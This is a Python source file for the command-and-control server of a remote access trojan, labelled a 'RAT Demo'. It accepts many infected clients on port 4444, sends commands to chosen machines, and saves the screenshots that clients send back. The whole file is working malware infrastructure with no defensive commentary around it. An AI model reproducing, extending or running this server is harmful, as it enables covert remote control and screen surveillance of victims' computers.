"""
C2 Server for RAT Demo
Handles multiple client connections and command routing
"""

import socket
import threading
import signal
import sys
import time
import argparse
from typing import Dict, List
from protocol import Protocol, Commands, ResponseTypes

class ClientHandler(threading.Thread):
    """Handles individual client connection"""
    
    def __init__(self, server, client_socket, client_address):
        super().__init__()
        self.server = server
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = f"{client_address[0]}:{client_address[1]}"
        self.running = True
        self.daemon = True
        
    def run(self):
        """Main client handling loop"""
        print(f"[+] Client connected: {self.client_id}")
        self.server.add_client(self.client_id, self)
        
        buffer = ""
        while self.running:
            try:
                data = self.client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        self.handle_message(line.strip())
                        
            except socket.error:
                break
            except Exception as e:
                print(f"[-] Error handling client {self.client_id}: {e}")
                break
                
        self.cleanup()
    
    def handle_message(self, message: str):
        """Handle incoming message from client"""
        parsed = Protocol.parse_message(message)
        if not parsed:
            return
            
        msg_type = parsed.get('type')
        if msg_type == ResponseTypes.PONG:
            print(f"[*] Heartbeat from {self.client_id}")
        elif msg_type == ResponseTypes.SCREENSHOT:
            print(f"[*] Screenshot received from {self.client_id}")
            self.server.handle_screenshot(self.client_id, parsed.get('payload'))
        elif msg_type == ResponseTypes.POPUP:
            print(f"[*] Popup response from {self.client_id}: {parsed.get('status')}")
        elif msg_type == ResponseTypes.ERROR:
            print(f"[-] Error from {self.client_id}: {parsed.get('payload')}")
    
    def send_command(self, cmd: str, **kwargs):
        """Send command to client"""
        try:
            message = Protocol.create_command(cmd, **kwargs)
            self.client_socket.send(message.encode('utf-8'))
            return True
        except socket.error:
            return False
    
    def cleanup(self):
        """Clean up client connection"""
        self.running = False
        self.server.remove_client(self.client_id)
        try:
            self.client_socket.close()
        except:
            pass
        print(f"[-] Client disconnected: {self.client_id}")

class C2Server:
    """Main C2 Server class"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients: Dict[str, ClientHandler] = {}
        self.server_socket = None
        self.running = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            
            print(f"[*] C2 Server listening on {self.host}:{self.port}")
            self.running = True
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    handler = ClientHandler(self, client_socket, client_address)
                    handler.start()
                except socket.error:
                    if self.running:
                        print("[-] Error accepting client connection")
                    break
                    
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            self.shutdown()
    
    def add_client(self, client_id: str, handler: ClientHandler):
        """Add client to active clients list"""
        self.clients[client_id] = handler
    
    def remove_client(self, client_id: str):
        """Remove client from active clients list"""
        if client_id in self.clients:
            del self.clients[client_id]
    
    def get_clients(self) -> List[str]:
        """Get list of active client IDs"""
        return list(self.clients.keys())
    
    def send_command_to_client(self, client_id: str, cmd: str, **kwargs) -> bool:
        """Send command to specific client"""
        if client_id in self.clients:
            return self.clients[client_id].send_command(cmd, **kwargs)
        return False
    
    def handle_screenshot(self, client_id: str, base64_data: str):
        """Handle screenshot data from client"""
        if base64_data:
            filename = f"screenshot_{client_id.replace(':', '_')}_{int(time.time())}.png"
            try:
                Protocol.decode_image(base64_data, filename)
                print(f"[+] Screenshot saved as {filename}")
            except Exception as e:
                print(f"[-] Error saving screenshot: {e}")
    
    def signal_handler(self, sig, frame):
        """Handle shutdown signals"""
        print("\n[*] Shutting down server...")
        self.shutdown()
    
    def shutdown(self):
        """Shutdown server and cleanup"""
        self.running = False
        
        # Send quit command to all clients
        for client_id, handler in list(self.clients.items()):
            handler.send_command(Commands.QUIT)
            handler.cleanup()
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print("[*] Server shutdown complete")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='RAT C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=4444, help='Port to bind to')
    
    args = parser.parse_args()
    
    server = C2Server(args.host, args.port)
    server.start()

if __name__ == "__main__":
    main()